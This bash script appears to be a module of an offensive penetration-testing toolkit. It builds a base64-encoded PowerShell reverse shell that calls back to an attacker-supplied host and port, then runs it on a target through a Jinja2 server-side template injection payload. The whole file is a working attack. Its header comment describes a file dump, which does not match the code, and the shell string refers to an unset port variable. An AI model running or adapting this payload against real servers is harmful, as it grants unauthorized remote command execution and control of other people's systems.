#!/bin/bash

: '
SSTI - jinja2 lfi dump file - windows (powershell)
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
LHOST_FIELD=$(form_item  "LHOST"  "lhost" "${KALI_IP}")
SHELL_PORT_FIELD=$(form_item  "port" "number" "shell_port" "1337")

# Generate GUI form
generate_form "${LHOST_FIELD}" "${SHELL_PORT_FIELD}"

LHOST=${form_data["lhost"]}
SHELL_PORT=${form_data["shell_port"]}

REV_SHELL=$(echo "\$client = New-Object System.Net.Sockets.TCPClient(\"${LHOST}\",${PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()" | iconv -t UTF-16LE | base64 -w 0)

SHELL="powershell -nop -e ${REV_SHELL}"

execute_command "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('${SHELL}').read() }}"
